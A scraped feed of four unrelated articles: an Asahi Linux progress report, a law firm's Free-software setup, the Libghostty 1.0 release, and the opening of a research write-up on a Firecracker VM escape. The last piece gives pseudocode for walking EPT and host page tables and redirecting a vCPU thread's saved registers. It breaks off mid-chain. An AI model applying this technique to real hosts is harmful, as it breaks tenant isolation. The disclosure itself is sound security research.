title: Asahi Linux Progress Linux 7.3
body_text: Progress Report: Linux 7.3 - Asahi Linux About Community Contribute Governance Documentation GitHub Blog Merch Donate / Blog / Progress Report: Linux 7.3 Progress Report: Linux 7.3 Previous Well here we are again. Linux 7.3 is out and it’s been an eventful few months, so let’s get stuck in to another Asahi Linux progress report! Upstreaming continues As always, upstreaming work continues to progress. Aside from the usual patches for low-level SoC blocks, two major drivers made it on to the list this cycle: macaudio and avd. Getting macaudio ready for submission has been a challenge. The audio subsystem on Apple Silicon devices is rather special, and required quite a number of core ALSA changes to properly support it. Apple also uses special variants of speaker and headset amplifiers that were already supported upstream, and these drivers also needed some pretty significant modifications. We have previously discussed a lot of this work at length, and we are finally in a position where we can submit the main driver for review. The driver and Devicetree changes represent a hefty chunk of our total patchset, about 3100 lines. AVD is a whole different beast. The AVD driver has spent barely 3 months in our downstream tree and is already on the list. This is our shortest turnaround time yet for a major SoC component and bodes well for a transition to upstream-first development some time in the future. This is fantastic news, as the AVD driver and related Devicetree changes are around 13000 lines of code. Also making an appearance on the list this cycle are initial Devicetrees not only for M4 Pro and Max devices but also M5 thanks to Yureka’s tireless efforts. As usual these initial Devicetrees are barebones and only sufficient to boot the SoC to a TTY, however work is progressing on further enablement. Watch this space! We have also begun shifting to an upstream-first approach where practical. Changes to the TI USB-PD and SPMI drivers required for new devices, as well as initial support for Thunderbolt, were all developed upstream-first. We are so thrilled to see our focus on upstreaming starting to pay off! M3 goes GA Last time, we announced initial support for M3 series machines via the EXPERT flag on the Asahi installer. We are pleased to announce that we received almost no issues from early adopters, so M3 support is now generally available without the EXPERT flag! We have also made a number of improvements to M3 support, most notably enabling DCP. On top of performance and battery life improvements, this also allows us to enable sleep on M3 series devices and make the area around the notch useable on the MacBooks! Keep an eye out for m1n1 and kernel updates in the coming days. Crowded House Last time, we teased support for virtualising SPTM-enabled versions of macOS in m1n1, which enables reverse engineering on M4 series machines. M5 presents a new challenge, as the versions of macOS which support it all require the use of Exclaves. Exclaves are small applications running in an isolated environment controlled by the Secure Kernel. On M5 series SoCs and above, macOS uses them for sensitive tasks such as drawing the “camera in use” indicator to the screen. XNU communicates with the Secure Kernel and its Exclaves via SPTM, using yet another IPC protocol called Tightbeam. Much as with SPTM, XNU will panic if it cannot find the running Exclaves. This is all starting to look very similar in concept to Arm’s own TrustZone feature. While some Exclaves can be bypassed by changing some settings on the command line, we predict that this will not always be the case. As such, Sven started looking at how we could fit all of this in to m1n1. First line of investigation, try putting the Secure Kernel and Exclave userspace in another VM next to SPTM and macOS. Oh, that worked , and we’re now up to spawning three VMs in EL1 under m1n1! Maybe we can start selling m1n1 to companies fleeing VMWare… With that, we can now virtualise and reverse engineer macOS on both M4 and M5 series machines. Hello Triangle(s)! While M3 support is now mostly at feature parity with M1 and M2, the very obvious exception to this is the GPU. Apple’s GPU team seems to follow a tick-tock model, and the M3’s GPU was a very significant departure from the models found on M1 and M2 SoCs. We mentioned quite some time ago that the M3 GPU was being reverse engineered by a new group of contributors, however not much has been said since. At XDC this year, Alyssa Millburn , Anna Maniscalco and TellowKrinkle gave a talk on their progress reverse engineering the M3 GPU. Work has progressed far enough for m1n1 to successfully initialise the GPU and for the team to draw a triangle! Fans of the “Think Different” sections of these progress reports will find the talk edifying; Apple have once again made a number of… interesting choices which will require significant engineering effort to integrate into upstream Mesa. It is well worth a watch if you’re interested in more detail. A huge thanks goes out to everyone who has made this work possible. More progress is on the way, so stay tuned. Kept you waiting, huh? All the way back in January of 2024, we made the mistake of promising Thunderbolt support within the year. It’s a mistake we won’t quickly repeat. We’ve said almost nothing about Thunderbolt in the two years since, which begs the question: where is it? It’s on the mailing list! Thunderbolt was originally developed by Apple and Intel, with Intel handling the design and fabrication of the hardware required. Since Intel made these controllers available to anyone who wanted them at a (mostly) reasonable price, no one else bothered to design their own. It is only very recently — largely coinciding with the transfer of the standard to the USB-IF — that companies like AMD have decided to roll their own controllers. Apple is of course no exception. As part of their push for insourcing most silicon IP, Apple made the choice to design their own Thunderbolt controller before most others. Surprising no one, the controller is of course a Cortex-M3 running RTKit coupled with a bespoke Thunderbolt/USB4 router. There is one of these for each Thunderbolt-enabled USB-C port on all Apple Silicon Macs. Since Intel supplies every other extant Thunderbolt controller on the market, the Linux kernel’s Thunderbolt subsystem is effectively designed around them. It makes a number of assumptions about the hardware topology of the running machine, including hardware capabilities and access patterns for certain registers and regions of shared memory. Apple’s controller breaks a lot of these assumptions. Great. The Thunderbolt controller is also oddly coupled to PMGR. The reset line for each controller is asserted or deasserted by setting and clearing a set of bits in the middle of PMGR’s MMIO range. No other hardware block works quite like this, and it took some time to realise that these seemingly random writes to PMGR were not just noise. Luckily for us, Sven was up to the task of dealing with all this nonsense. It just took slightly longer than expected! While the patchset to enable Thunderbolt was sent upstream first (another massive win for us!), we have also pulled it into our downstream kernel and are now shipping it to users! But there is a catch. Currently, only USB3, XDomain and Thunderbolt Networking are supported. You can plug in USB devices or connect two Thunderbolt computers together and make them ping each other, but that’s about it. PCIe and DisplayPort tunnelling — required for most Thunderbolt docks — are not supported. Yet. Watch this space. An enormous amount of gratitude is owed to Sven, who has stuck with this thankless chore for nearly 5 years in between all of his other incredible work. “The Holy Grail, Doctor Jones” Playing retail PC games on Asahi Linux is a bit of a pain point, to say the least. The software stack required to enable this is incredibly complex. We need to translate x86/amd64 binaries to arm64, and do so fast enough for low-latency gaming. In most cases, we also need to deal with the Windows API. On top of that, almost all games bake in an assumed 4 KiB memory page size to enable certain performance optimisation. Over the past few years, most of these problems have been solved: FEX has improved leaps and bounds. The performance and reliability of binary translation is hardly a consideration in most cases now; WINE is also fantastic now. Support for ARM64EC is mature and reliable, meaning that FEX now only has to translate the game binaries rather than WINE’s entire Windows API implementation; and muvm allows us to spin up a thin VM with DRM Native Context to present a 4 KiB memory page size to x86/amd64 applications. When muvm was first developed, it was with the assumption that DRM Native Context would enable near-native GPU performance from inside the VM. Unfortunately, this assumption did not hold. The muvm performance penalty is quite significant for a number of reasons, about 20% depending on the workload. Engineering around the limitations inherent to using a VM also introduces issues; muvm cannot use Wayland, has slow I/O performance, and struggles with certain types of input devices. This is one area where macOS has us completely licked. While the performance gap between FEX and Rosetta has narrowed, XNU allows userspace processes to map themselves at any page granularity, so all Rosetta needs to do is tell XNU to map 4 KiB pages for its child processes. Linux does not have this flexibility. All pages must be mapped at the same granularity as the kernel. While we did tease Windows games working outside of muvm last year, this relied on ugly hacks inside FEX which have since been removed in the interests of maintainability and translation correctness. Bummer. Even so, compatibility was hit-and-miss, with a lot of (mostly older) software still refusing to work. Double bummer. Android is currently going through a transition from 4 KiB pages to 16 KiB pages for a variety of reasons. Google Play now requires apps to be built for 16 KiB systems, and any application updates which do not test successfully on such systems will not be approved for publication on the Play Store. What about applications which are no longer updated though? What about sideloaded enterprise slop apps? Google engineers Kalesh Singh and Frederick Mayle gave a very interesting talk at Linux Plumbers Conference this year about exactly this. Their solution is simple: just fix Linux so that userspace can map 4 KiB pages! Their addition to the Android kernel is called P3S, or Per Process Page Size. On ARM64 systems, pagetable granularity is controlled by bits set in the Translation Control Registers (TCR). P3S works by tracking the granularity of each process’s pagetables, and writing the appropriate bits to the TCR whenever a process with a different pagetable size is switched to. Because this is a single register write, and because this is a no-op for “native” page size processes, the performance penalty is effectively zero! While this effort is primarily targeted at Android, the patchset mostly rebases cleanly on top of mainline Linux. What happens if we rebase it on top of our Asahi tree (and fix some bugs)? As it turns out: Star Wars Battlefront (2004) running outside of muvm, with WineD3D Okay okay, Battlefront is a very simple Direct3D 9.0 game from 22 years ago. Not exactly an impressive demo, right? Well what about: Wolfenstein: The New Order (2014) running outside of muvm Wolfenstein: The New Order is an extremely well-optimised OpenGL title, and being 64-bit uses WINE’s ARM64EC pathways to massively reduce the amount of work FEX has to do. Again, not exactly an impressive demo if we’re judging based on technical difficulty. Let’s find something else. Something… worse. Something 32-bit so that FEX and WINE have to work harder. Something that will exercise DXVK too. Something that is so comically buggy and poorly optimised that it doesn’t even work properly on real Windows machines, and relies on community patches and command line switches to start at all on modern computers: Grand Theft Auto IV (2008) running outside of muvm, with DXVK That’s more like it! But we can do even worse . We can even run… Bethesda games! Fallout: New Vegas (2010) running outside of muvm, with DXVK Performance is of course still patchy. Both Battlefront and Wolfenstein run essentially flawlessly, with the latter hitting 144+ FPS on an M2 Max Mac Studio. GTA IV on the other hand is… not fantastic. Performance is still massively improved over using muvm, and eliminating the use of the VM in general should also eliminate a few classes of bugs. Debugging the GPU driver should also be much easier with this approach. As always there is a catch, and unfortunately it’s a big one. The current solution is hard-coded for 16 KiB hosts and 4 KiB processes on those hosts. This obviously satisfies Google’s commercial requirements, but adding pagesize-specific kludges to the kernel’s core memory management code is not appropriate upstream. We are unsure if Google intends to generalise this approach and upstream it, or if this is going to stay an Android-only patchset. As such, we do not want to ship this in our downstream tree and have folks become reliant on it when there is this level of uncertainty. It also requires userspace integration. P3S works by checking the binary metadata for its sections’ page alignments. This works for Google’s use case, as P3S is intended as a fallback mechanism for applications aligned to 4 KiB pages. Modern arm64 binaries are aligned to 64 KiB however, as this guarantees compatibility with systems of all native pagesizes. Thus, a shim is required to force P3S on. The shim triggers P3S, and any child processes will inherit its 4 KiB pagesize. It is not worth spending the effort on implementing this until we have some certainty around what Google intends to do with this patchset. We have reached out to Google with some questions, and we hope to have more to say soon. Mics, but faster Our custom beamformer for the microphone array found in the MacBooks is written in Rust. Rust’s scientific computing ecosystem is not as mature as C++’s, which is a bit of a problem as beamforming requires realtime FFT and very heavy matrix operations to be done on buffers filled with audio samples. Mature scientific computing libraries have hand-optimised code, often using intrinsics tied to the target ISA. We were not doing this however, and relied on the compiler autovectorising code where it could to achieve our performance targets. This fell apart when we eliminated the FFT-based analytic transform, replacing it with an implementation based on infinite impulse response (IIR) filters. This should be faster, however the compiler was failing to autovectorise the new implementation. Linkmauve kindly stepped in and added SIMD-optimised code for both arm64 and amd64. This, coupled with other performance optimisations courtesy of Frédéric Bour has resulted in Triforce becoming almost twice as fast, all while using less CPU time! Keeping up Fedora Linux 45 was released on 3 November, and we shipped Fedora Asahi Remix on the same day. This is the first time we have been able to get a new version of Fedora Asahi Remix out on the same day as upstream! Learning from history We take great pride in our work, and have always done all of our development in the open. We communicate with our users, our followers and our financial sponsors as transparently as is humanly possible. Our finances are in the open, our development branches are in the open, and we report our progress regularly and candidly in the open. Our IRC channels and Matrix rooms are safe spaces, open to anyone with even a passing interest in Asahi Linux or hacking on Apple Silicon. We do all of this because we firmly believe in Free and Open Source Software, not just as a means to an end but as the end in and of itself. The modern digital world is only possible because of the Free Software movement, and it is more important now than it ever has been that we do all we can to protect the Free Software ecosystem and uphold the ideals upon which it is built. It may surprise some to learn that WINE was originally made available under the MIT licence. The 90s and 2000s were a very different time in the Free Software ecosystem, and permissively licenced projects were viewed by tech companies as free real estate to pilfer and exploit. WINE was not immune to this, and many monetised proprietary forks of WINE were marketed and sold by various bad actors. The WINE development team grew increasingly concerned that these proprietary forks, while well within their rights to exist, would eventually cause so much fragmentation in the ecosystem that WINE itself would become unviable. In 2002, WINE was relicenced under the LGPL to prevent further proprietary forks from being created, and to encourage direct upstream contribution. When Asahi Linux was first started, it was with the intent that we develop a Free Software ecosystem for the Apple Silicon platform. To facilitate and encourage the participation of our friends at the BSDs and other Free Software operating systems, we endeavoured to licence as much of our code as possible under the permissive MIT licence. Unfortunately, this is no longer viable. The malicious practices of the 90s and 2000s have reared their ugly heads once again, this time driven in large part by both the insatiable appetite of frontier AI labs for high-quality training data, and militant animosity toward the Free Software community. Some time ago, we were made aware of multiple attempts to exploit our permissive licensing to hijack our work, with a direct view to replacing the project and aggressively monetising Linux on Apple Silicon. In some extreme cases, in-development feature code was being lifted straight out of our personal forks and published without attribution or lazily rewritten with LLM assistance to obfuscate its origin. The MIT licence explicitly allows this, and has no carveouts to protect against bad faith actors. As such, we made the difficult decision to begin the process of transitioning all of our repositories to the GNU General Public License version 2 or later. Going forward all Asahi Linux code will be licenced under strong copyleft licences only. Those who do not learn from history are doomed to repeat it. Until next time! As always, we would like to sincerely thank our supporters on OpenCollective and GitHub Sponsors . It is only through your generous backing that we are able to dedicate the time and resources to continuing our work reverse engineering the platform and bringing to it a world-class, polished, and battle-tested Linux desktop experience. You mean the world to us. James Calligeros · 2026-11-07 Licensed under CC BY-SA 4.0 Linux® is the registered trademark of Linus Torvalds in the U.S. and other countries. title: Running a law firm on Free software
body_text: Running a law firm on Free software (2026 edition) | decoded.legal's blog " /> decoded.legal's blog Running a law firm on Free software (2026 edition) Published on: 2026-11-06 12:18:47 by Neil Brown I started running decoded.legal - a small English law firm, focussing on Internet, telecoms, and tech law - on Free software, both client and server side, around five years ago. I have used Free software in my personal life for a lot longer than that. Back in 2022, I wrote about my experiences after the first year or so . I wrote an update in 2024 . Someone asked me recently what I am doing now, and, while it is mostly the same, some bits have changed. So here is the 2026 update. Client-side stuff I am still using Debian, with GNOME, and it works well for me. Iâm using it on a ThinkPad X1 Yoga Gen 6 , as my primary machine, and, being a âYogaâ version, I rather like being able to fold the screen back and write on it to mark up documents. ( Here are my thoughts on the different âActive Pensâ available for it .) However, the machine itself seems to have a hardware problem with the Thunderbolt / USB-C ports (fine for power, very flaky for data), and so I might need to replace it. And I have no idea what laptop I might get. Email (MUA): Thunderbird and mutt , depending on what I am doing Quick Folder Move and Move Message And Yourself are particularly useful add-ons for Thunderbird, for rapid filing of email with keyboard shortcuts Thunderbird seems to be having a problem with some recurring calendar invitations, while ikhal is handling them fine. Iâve not dug into it, but it is a nuisance. Document production: LibreOfficeâs Writer if I want a âWordâ document (e.g.Â I am exchanging documents with other lawyers), and I am using pandoc and typst to convert Markdown files that I tend to write in vim for some other bits. Iâd like to explore tex at some point, as I have a client who likes diffs to their .tex files, and that looks rather neat. Presentations: reveal.js I absolutely love this. I have a bash script which sets up a template for a new presentation, and then I just write the presentation using Markdown. I get a nicely-formatted presentation (using a css template) with very little effort, and no distracting GUI Blogpost about reveal.js Here are some presentations Iâve given, using reveal.js File manager: Nautilus Mainly because it is GNOMEâs default, although, especially when combined with some useful bash scripts , it works well for my needs PDFs: evince for most reading; Xournal++ for marking up PDFs; PDFarranger and pdftk for interfering with PDFs Text expansion: espanso This is a fantastic shortcut for me, saving me from typing the same thing multiple times. I have loads of shortcuts set up, and Iâd be lost without them. Browser: Firefox or links I am still using Firefox. It is â¦ fine? I should probably look at LibreWolf or another fork, as Iâm not enamoured by Mozillaâs direction of travel but, for now, Firefox it is. I use Firefox for joining peopleâs Teams and Zoom etc. meetings, if someone else sets up the meeting, and that works fine Local wiki / knowledge management: vimwiki because I use vim so much, vimwiki was quite an obvious choice. I use this for keeping track of my professional development, and for various notes Disk encryption: LUKS Client-side encryption of files before syncing them with Syncthing : Cryptomator Fediverse: I tend to use the Mastodon advanced web UI or, when I want fewer images, the TUI toot . I schedule toots - for example, about blogposts, using a simple bash script and a cron job ; it has moved on a bit since I wrote that post, but it is the same principle Password manager: Bitwarden , using the vaultwarden server, with YubiKeys for managing more sensitive credentials Markdown editor (for blogposts; I do presentations in vim or gedit): Apostrophe Scanning: paperless-ngx Label printing: thereâs a great FOSS web UI for Brother (and perhaps other) label printers . I donât print many labels, as we aim to be paperless, but itâs convenient when I need to do so Why so many terminal-based tools? The simple answer is that I am very comfortable in a terminal, and I like them. They have fewer distractions and, when compared with most GUI software, are just - IMHO - easier to use, especially when I donât need to move my hands away from the keyboard. So, while I donât use them exclusively, I use mutt , vim , ikhal , ncmpcpp , newsboat , toot , links , and various other TUIs, frequently. Server-side stuff Everything here - other than Signal - is self-hosted, and Iâm mostly using Intel NUCs now. I still have some Raspberry Pi devices, but fewer than I did. (Again, this doesnât list everything; just the main applications.) Email (MTA): postfix / dovecot I need to move our mail infrastructure at some point, and I want to look at Stalwart. File synchronisation: Syncthing One of the bigger changes since last time was moving away from Nextcloud. I just was not getting on with it, and it was causing me more problems than it solved. So I switched to Syncthing for file sync, and radicale for CalDAV / CardDAV. Iâve been more than happy with this combination. Video conferencing: Signal I ran jitsi for years, but stopped using it a few months back. Jitsi is great, and I remain a fan, but most of the time I am joining other peopleâs Teams or Zoom meetings, so I was running the Jitsi server for very little usage. I turned it off, and instead offer Signal. I have had no grumbles. Invoicing and tracking payments: InvoicePlane , just for generating PDF invoices. Clients donât interact with it Time tracking: Kimai v2 of Kimai is excellent, and I had a very pleasant exchange with the developer, which is always nice. âCase managementâ / âMatter managementâ: EspoCRM VPN: WireGuard , using trailofbitâs algo ansible scripts on one machine, and PiVPN on another (albeit not on a Pi) Vulnerability scanning: greenbone/OpenVAS Monitoring: Uptime Kuma I implemented this not long after the last update. It â¦ just works? Forge / hosted git repository: Forgejo I use this for version tracking the website, and for a couple of template projects I do not host anything particularly important on it - for that, I have a git process running on another machine, which is not accessible over the Internet, and I just push to that SIEM: Wazuh Password manager: vaultwarden Website: it is a static site built via mkdocs , hosted on apache2 It got even simpler and even faster to load. Yes, itâs basic, but I like it! We still have an .onion version . If you visit decoded.legal in Tor Browser, it should re-direct your automatically Blog: BSSG After a couple of annoyances with hugo, I moved to BSSG - a bash static site generator. The developer, Stefano, is amazing, and it is working incredibly well. Iâve gone for a very basic, easy to read, theme - which should be very similar to what was there before - and thereâs still an RSS feed for it, of course I blog quite frequently, and, rather than keep private / internal âknowhowâ files, I tend to just blog things and share the learnings I tend to use my personal blog for posts about the more technical bits and pieces I have automated the most common actions - templates, and publishing - using bash scripts, so that I can focus on writing (in Markdown); getting it online is the easiest bit Fediverse: I am using the *glitch-soc Mastodon** fork Switching from normal Mastodon to glitch-soc Mastodon was easy I stopped using Markdown in toots, even though I like the rendered output (i.e.Â as html not as markdown), but this is not supported consistently well across clients, so I stopped using it. I turned off decoded.legalâs own fedi instance. I had been on the fence as to whether this is worthwhile or not for a while, and decided that, really, it was not. Knowledge management, and managing our law firmâs (numerous) policies and procedures: dokuwiki with the Markdown plugin DNS: unbound , with Pi-Hole in front of it I used to run a doh server, but Iâve stopped doing that. Backups: restic and rsync Notes on restic Forms: LiberaForms I have been really happy with LiberaForms, for easy-to-create and easy-to-use forms, especially since they implemented encryption, so that the form responses are stored encrypted on the server. I still delete them as soon as I can, but knowing that they are encrypted in the database is welcome. I use LiberaForms for our âKnow Your Clientâ pre-engagement questionnaire, and for various other bits Collaborative document editing: I donât. I used to run CryptPad, but it just didnât get much use, so I turned it off. AI tools None, for various reasons . Mobile device Iâm using a Pixel running GrapheneOS for my mobile device. I use F-Droid as the main app store. Using Android doesnât thrill me, especially given Googleâs direction of travel, but at the moment - despite trying quite a lot of different OSs and devices, including postmarketOS and Ubuntu Touch, as well as SailfishOS previously - I have not found something that does what I need better than GrapheneOS. Working with others (who donât use FOSS tools) No change here: zero problems. Many of my clients use Microsoftâs software, or Appleâs software. Libghostty 1.0
body_text: Libghostty 1.0 – Mitchell Hashimoto Mitchell Hashimoto About Writing Misc Mitchell Hashimoto Libghostty 1.0 November 6, 2026 libghostty-vt 1.0 is here. libghostty is a portable, high-performance C library for terminal emulation, extracted directly from the core of Ghostty. The 1.0 release means both the library itself and the C ABI are now stable. A little over a year ago, I wrote that libghostty is coming . At the time, the Zig module had just been merged, the C API didn't exist, and nobody but Ghostty was a consumer. Today, the C API is a complete terminal emulator, it runs in production for millions of people across hundreds of products, both free and commercial, and it has a real, enforced ABI stability policy. This post is about how we got here and what 1.0 actually means. 1 Who Is Already Using It Since starting the Ghostty project in 2022, the most common question I've been asked is "why?". I already answered this in the libghostty is coming post, so feel free to read that if you wish. Today, I'd rather answer this by showing the broad industry impact libghostty has already had . I believe this strongly validates its existence. A year ago, I used a bug in JediTerm , the terminal emulator in JetBrains IDEs, as an example of why terminal emulation is hard to get right. A year later, the terminal in JetBrains IDEs now runs on libghostty . Every IntelliJ, PyCharm, GoLand, etc. user now has a libghostty-powered terminal. Based on a report by JetBrains, that's over 12.5 million active users. Neovim has an approved pull request replacing libvterm with libghostty-vt . Among other things, it closes a 10-year-old issue about reflowing scrollback on resize. The maintainers are waiting on a tagged release before merging so that distributions can package the dependency separately, and the release today should enable that. KDE developers are experimenting with a Konsole replacement built on it. Vercel's Turborepo uses it to render task output in its TUI. devenv uses it to drive shells. Antithesis used it to fuzz TUI programs and found real bugs in btop and others. Ghostel brings it to Emacs. ghostty-web is the WASM build with an Xterm.js-compatible API. Commercial products like OrbStack embed it. And a whole wave of new terminals and "agentic" coding tools, such as herdr and cmux , have been built on it rather than writing yet another emulator. There are community bindings for Rust, Go, JavaScript, Swift, Python, .NET, Elixir, Dart, Java, and more, and the awesome-libghostty list tracks well over a hundred projects. More people today use a terminal powered by libghostty than use Ghostty the application, by a very large multiple. And libghostty is having a much larger impact than being "just" a terminal emulator. 2 ABI Stability 1.0 means libghostty-vt follows semantic versioning and has strict ABI compatibility promises so that packagers across distributions and operating systems can be confident packaging libghostty-vt and program developers can be confident dynamically linking against it. Beyond providing useful features, I believe the hallmark of a high-quality and enduring C library is ABI stability. So from the start, I took inspiration from C libraries I enjoyed working with and designed the API to have a strong, stable ABI that allows for future additions. Every object is an opaque handle. The hundreds of values you might read or write go through a small set of enum-keyed getters and setters, so we can add new values easily without introducing a new symbol. Programs with newer headers linked against an older libghostty get GHOSTTY_UNSUPPORTED results instead of crashes or undefined behavior. The few non-opaque structs we have carry their size so that fields can be appended later, or contain reserved padding. Enums are pinned to int on every compiler, as much as the C standard allows. Our CI enforces our ABI policy. Every change is checked with libabigail against a committed baseline on Linux, and against golden type manifests on macOS and WebAssembly. On ELF platforms, every exported symbol is also versioned, so the dynamic loader refuses to load a mismatched library by name rather than failing in some mysterious way later. Packaging In addition to ABI stability, the 1.0 release brings along the proper build tooling, tarballs, dependency licensing manifests, documentation, and more to enable every major operating system and distribution to package libghostty-vt through standard official tooling. Libghostty has its own release cycle, separate from Ghostty the application. And it has its own tarballs with only the files and dependencies libghostty needs, resulting in smaller sizes and simpler licensing verification and compatibility. Each release publishes a signed source tarball along with a companion dependencies tarball containing every Zig package in Zig's own cache layout, so a distribution can build the library completely offline. The build installs the shared and static libraries with a proper SONAME, headers, pkg-config files, and a CMake package config, and it honors --prefix , DESTDIR , and lib64 . Debug info is kept by default so distros can split it out. All of this is documented in PACKAGING-LIBGHOSTTY.md , which ships with the tarball. Dependencies and Licensing libghostty-vt is MIT licensed. At runtime it needs nothing beyond libc, and it can be built fully freestanding if you don't want that either. 3 The library compiles in a small number of permissively licensed dependencies: simdutf and Google Highway for SIMD, a compact Unicode table for grapheme data, and Wuffs for image decoding in the Kitty graphics protocol. Both simdutf and Highway are built without libc++ , so there is no C++ standard library dependency. There is no copyleft code anywhere in the dependency tree. Every dependency is listed in a machine-readable manifest with its version, SPDX license, and hash, specifically so distros can fill in their bundled-library metadata more easily. If a distro would rather dynamically link the system simdutf or Highway, there's a build flag for that. Portability libghostty-vt is highly portable. The table below lists all the platforms and architectures that we build and test (full unit tests plus running all examples) in CI: Platform Architectures Linux (glibc, musl) x86_64 , aarch64 macOS 13+ x86_64 , aarch64 iOS 13+ aarch64 FreeBSD x86_64 , aarch64 Windows x86_64 Android aarch64 , x86_64 , arm WebAssembly wasm32 (freestanding) There is a second set of platforms we build in CI but do not run tests for. These systems all have known users; we just haven't set up the machinery for automated testing: Platform Architectures Bare metal riscv32 , thumb WebAssembly (WASI) wasm32 Windows arm64 illumos x86_64 32-bit x86 x86 Each of the tested platforms gets the artifacts it expects: Linux and FreeBSD get a shared library with a proper SONAME and versioned symbols, a static library, headers, pkg-config files, and a CMake package config. macOS and iOS get a dylib with an @rpath install name and compatibility version, plus an XCFramework covering macOS, iOS, and the iOS simulator that drops straight into Xcode or Swift Package Manager. Windows gets a DLL with a .pdb , an import library, and a static library. The library is built with the GNU ABI, but MSVC programs link against it through the import library and CI verifies this. Android gets a shared library built against the NDK with 16 KB page size support, as required by Android 15+. WebAssembly ships in two flavors, one optimized for speed and one for size, and the small one is under a megabyte with every feature enabled. If you only need a read-only viewer, subsystems like input encoding, search, selection, and Kitty graphics can be compiled out with a build flag, which roughly halves the module. Every function stays exported and simply returns GHOSTTY_UNSUPPORTED so your code doesn't have to change. 4 Portability isn't just about the ability to build and run. It's also about resource usage and being able to work in a wide variety of resource environments. For resource usage, the library creates no threads, allocates only through an allocator you can customize, and uses minimal compute and memory. I've run 10,000 active terminals, each with a live shell producing output, on a Linux server with 4 cores and 8 GB of RAM. In this test, I had to use dash because bash used far more RAM than libghostty-vt and wouldn't fit into the 8 GB budget. What's Next Libghostty 1.0 is a major milestone. You can now create a terminal in ~1,500 lines of C that has more features and better performance than just about any terminal that existed in 2025, and most today in 2026. 5 And thanks to the rich ecosystem of language bindings, you can do this in every major programming language. You get this for free. For almost no effort. You can just do it. libghostty-vt is a generalized library, so we will focus on stability while implementing as many terminal protocols as exist (giving options to enable/disable them, of course) so that embedders have the luxury of choice. Every bug any libghostty-vt embedder reports makes everyone else in the ecosystem better. Every feature we ship in libghostty-vt becomes available to everyone quickly and safely. Terminals can move faster with less fragmentation. Thank you to everyone who contributed to the library, wrote bindings, filed bugs, and shipped something on top of it while the API was still experimental. As with all open source, this was the work of a large community. Docs, examples, and downloads are at lib.ghostty.org . Boo. 👻 Footnotes As usual, I hate that I have to do this for every post, but I want to note this post was completely hand-written with no AI assistance. ↩ The numbers are rough because most consumers don't report usage, but JetBrains alone reports 12.5 million recurring active users , and that's before counting everything else on the list. ↩ In the original post I wrote "not even libc!" The default build does link libc, because the SIMD paths use it and the default allocator is malloc . Turn off SIMD and the library is freestanding, which is how it runs on bare-metal RISC-V and ARM targets. ↩ The feature flags aren't WASM-specific; they work on every target. They're likely useful for things like embedded devices too. ↩ "Features" here means the set of terminal protocols and sequences understood, and "performance" means parsing throughput and memory usage, since those are the parts libghostty-vt provides. ↩ November 6, 2026 © 2026 Mitchell Hashimoto. mail twitter Twitter icon mastodon github GitHub icon linkedin LinkedIn icon

title: Firecracker VM Escape: PwnEscape Part 2
body_text:
New PwnEscape: Guest-to-host escape through the Linux kernel Read the research → × Product Pricing Research Company Contact Start a Pentest Back Firecracker VM Escape: PwnEscape Part 2. PWN Research, Paulos Yibelo · 19 m 19 min read Firecracker is supposed to keep untrusted code inside a microVM. We escaped it and achieved code execution as root on the host. We found how it saved registers, changed where it would resume, and made it execute a call of our choosing when it returned from KVM. The guest then restored the temporary stack changes. Firecracker kept running, and the VM remained accessible over SSH. PwnEscape Part 1 introduced the host memory primitive behind this work. Here we follow the next part of the chain: using that access to find Firecracker in memory and take over a live thread from inside the guest. This is a continuation to show CVE-2026-99999 on a Firecracker setup. 00 / Choosing where to take control A Firecracker microVM has a process on the host that manages it. Each virtual CPU, or vCPU, has a thread in that process. The thread enters KVM to run the guest and returns to Firecracker when an event needs handling in userspace. Firecracker documents this arrangement in its architecture overview . firecracker-host-integration-dbdde36ef234 The call that runs the virtual CPU looks like this: ioctl(vcpu_fd, KVM_RUN, 0 ); While the thread is in that system call, the host kernel holds its saved userspace registers in a structure called pt_regs . These registers describe the Firecracker thread: its instruction pointer says where execution should resume, and its stack pointer says which userspace stack it should use. That made the return from KVM_RUN an attractive target. If we could locate and modify the saved frame, we could choose the code Firecracker executed when the thread returned to userspace. A guest operation that caused such a return would provide the trigger. We already had access to selected host physical memory through a guest mapping. To use it, we needed to identify the Firecracker process, find code we could call in that process, and locate the register frame belonging to its active vCPU thread. The starting point was a page of memory we controlled inside the guest. 01-guest-to-vmm-chain-5c0fbee0cb07 Figure 1. The guest identifies its Firecracker process, finds the saved registers for a vCPU thread, and redirects the thread when it returns from KVM. 01 / Finding our guest page on the host The guest and host use different physical address spaces. A page has a guest physical address, or GPA, inside the VM and a host physical address, or HPA, in the machine backing it. On the target, Extended Page Tables (EPT) provide the translation between them. We placed a recognizable byte pattern, a nonce, in a guest page. The first resolver took that page's known GPA and its contents as inputs. Together, they gave us an address to translate and a way to check whether the translation reached our page. The resolver searched the host physical ranges covered by the memory primitive for candidate EPT roots. An EPT root is the starting point of the translation tables. For each candidate, the resolver followed the entries selected by the guest address until it reached a physical page, then checked that page for the nonce. The snippets below are explanatory pseudocode with descriptive helper names. They show the data passed between stages and the checks used to connect them. for root in candidate_ept_roots: page_hpa = walk_ept(root, guest_gpa) if page_hpa is invalid: continue contents = read_host(page_hpa, length(nonce)) if contents == nonce: candidates.append((root, page_hpa)) The nonce check connected a proposed translation to memory we controlled. The broader search produced two candidates; validation of the nested page tables reduced them to one EPT root. Walking that root gave us the host physical address of our guest page. We called this result guest_page_hpa and passed it to the next resolver. We now had a recognizable object in host memory. The next task was finding the host process that mapped it. 02 / Finding the Firecracker process Firecracker maps memory used by the guest into its own address space. That mapping gave us a way to work backward from the guest page to the process. Host processes use page tables to translate their virtual addresses into physical memory. The top level is called the page global directory, or PGD. Recovering the appropriate PGD would let us translate addresses inside Firecracker and read its code and stack through the memory primitive. Our reverse mapper searched the native host page tables for a mapping of guest_page_hpa . A normal page table walk starts with a virtual address and produces a physical address. Here, we looked for a mapping to a physical page we already knew, then recovered the virtual address and page table root associated with it. The check runs in both directions: for mapping in reverse_map_host_page_tables(guest_page_hpa): pgd = mapping.root guest_page_va = mapping.virtual_address resolved_hpa = walk_host_page_tables(pgd, guest_page_va) if resolved_hpa != guest_page_hpa: continue if read_host(resolved_hpa, length(nonce)) != nonce: continue process_candidates.append((pgd, guest_page_va)) This connected the host process's virtual mapping to the physical page found through EPT. The reverse mapper returned one validated address space. We retained its root as host_pgd and used it to inspect the process. The next resolver looked for the Firecracker executable in those mappings. It identified an ELF image and checked a known byte sequence in Firecracker's write(2) wrapper. That connected the recovered address space to the binary we were targeting. ASLR changes where an executable is loaded. The difference between an address in the ELF image and its corresponding runtime address is the load bias. Once the mapper had identified the image, it could recover that bias and use it to locate the code required by the exploit: 